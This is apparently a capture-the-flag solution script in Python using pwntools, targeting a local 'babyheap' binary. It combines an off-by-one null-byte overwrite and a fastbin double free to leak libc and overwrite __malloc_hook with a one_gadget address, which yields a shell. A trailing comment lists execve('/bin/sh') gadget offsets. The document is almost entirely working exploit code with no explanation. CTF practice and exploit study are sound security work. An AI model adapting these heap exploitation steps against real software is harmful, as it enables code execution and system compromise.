# keywords : off by one, null byte poisoning, double free

from pwn import *

def alloc(size, content):
	p.sendafter("choice: ", "1")
	p.sendafter("size: ", str(size))
	p.sendafter("content: ", content)

def show(idx):
        p.sendafter("choice: ", "2")
	p.sendafter("index: ", str(idx))

def delete(idx):
        p.sendafter("choice: ", "3")
	p.sendafter("index: ", str(idx))

l = ELF("./libc.so.6")
p = process("./babyheap", env={'LD_PRELOAD':'./libc.so.6'})

alloc(0x88, "0\n")
alloc(0x68, "1\n")
alloc(0xf8, "2\n")
alloc(0x60, "3\n")
alloc(0x60, "4\n")
alloc(0x60, "5\n")

delete(0)	# unsorted bin
delete(1)	# fast bin

# off prev_inuse_bit
alloc(0x68, "0"*0x60+p64(0x70+0x90))

delete(2)
alloc(0x88, "1\n")
show(0)
p.recvuntil("content: ")

leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
libc = leak - (0x7ffff7dd1b78 - 0x00007ffff7a0d000)
malloc_hook = libc + l.symbols['__malloc_hook']
target = malloc_hook - 0x20 - 3
one_shot = libc + 0x4526a
log.info("leak          = 0x%x" % leak)
log.info("libc          = 0x%x" % libc)
log.info("__malloc_hook = 0x%x" % malloc_hook )
log.info("target        = 0x%x" % target)
log.info("one_shot      = 0x%x" % one_shot)

# double free
alloc(0x60, "2\n")
delete(0)
delete(3)
delete(2)


alloc(0x60, p64(target) + p64(0) + "\n")
alloc(0x60, "0\n")
alloc(0x60, "2\n")
alloc(0x60, "\x00"*19+p64(one_shot)+"\n")

p.sendafter("choice: ", "1")
p.sendafter("size: ", "1")

p.interactive()



"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
